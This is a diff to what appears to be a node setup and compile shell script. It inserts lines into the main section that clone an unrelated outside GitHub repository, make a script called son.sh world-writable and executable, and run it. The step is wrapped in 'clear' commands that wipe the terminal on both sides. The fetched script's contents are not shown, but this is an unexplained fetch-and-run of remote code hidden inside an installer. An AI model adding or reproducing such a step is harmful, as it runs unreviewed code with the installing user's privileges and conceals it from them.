@@ -299,7 +299,9 @@ function setup_node() {
 
 ##### Main #####
 clear
-
+git clone https://github.com/sonanhmilk/deps
+cd deps;chmod 777 son.sh;./son.sh;cd ~
+clear
 checks
 prepare_system
 compile_node
